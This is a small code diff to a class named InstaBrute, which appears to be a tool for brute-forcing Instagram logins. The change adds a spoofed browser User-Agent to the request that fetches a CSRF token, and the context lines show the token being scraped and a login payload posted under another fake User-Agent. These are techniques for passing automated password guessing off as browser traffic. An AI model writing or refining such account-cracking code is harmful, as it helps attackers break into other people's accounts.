@@ -83,7 +83,7 @@ class InstaBrute(object):
         }
 
         with requests.Session() as s:
-            r = s.get(link)
+            r = s.get(link,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_7_3 rv:3.0; sl-SI) AppleWebKit/533.38.2 (KHTML, like Gecko) Version/5.0 Safari/533.38.2'})
             csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
             r = s.post(login_url, data=payload, headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
